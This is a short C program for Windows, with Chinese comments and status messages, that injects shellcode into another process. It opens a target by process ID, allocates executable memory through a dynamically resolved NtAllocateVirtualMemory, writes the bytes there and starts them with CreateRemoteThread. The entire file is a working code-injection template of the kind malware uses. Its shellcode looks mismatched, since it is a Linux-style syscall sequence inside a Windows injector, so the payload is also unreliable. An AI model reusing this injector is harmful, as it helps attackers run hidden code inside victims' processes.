#include <windows.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE    ProcessHandle,
    PVOID     *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

unsigned char shellcode[] =
"\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50"
"\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05";

int main() {
    DWORD pid = 1234; // 目标进程ID
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("无法打开目标进程\n");
        return 1;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    if (NtAllocateVirtualMemory == NULL) {
        printf("无法获取NtAllocateVirtualMemory地址\n");
        CloseHandle(hProcess);
        return 1;
    }

    PVOID pRemoteCode = NULL;
    SIZE_T size = sizeof(shellcode);
    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &pRemoteCode, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        printf("无法分配内存\n");
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, pRemoteCode, shellcode, sizeof(shellcode), NULL)) {
        printf("无法写入内存\n");
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("无法创建远程线程\n");
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    printf("代码注入成功\n");

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
